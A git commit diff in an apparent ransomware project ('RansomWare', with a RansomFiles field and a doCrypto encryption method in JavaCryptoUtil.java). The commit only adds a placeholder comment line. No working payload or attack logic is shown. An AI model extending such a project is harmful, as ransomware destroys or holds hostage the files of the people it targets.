fbe5ecd67eb8658ce9492ade7d0798bf7610578e
osher <osherlev317@gmail.com>
2020-04-11 13:12:07 +0300

    coomit

--- RansomWare/src/main/java/Agent/EncryptionAlgo/JavaCryptoUtil.java
+++ RansomWare/src/main/java/Agent/EncryptionAlgo/JavaCryptoUtil.java
@@ -19,6 +19,7 @@ import Agent.exceptions.CryptoException;
 public class JavaCryptoUtil {
 	private RansomFiles changeFile;
 
+	// comment
 	public void doCrypto(SecretKey skey, File inputFile, int cipherMode, File outputFile, String algorithm)
 			throws CryptoException {
 
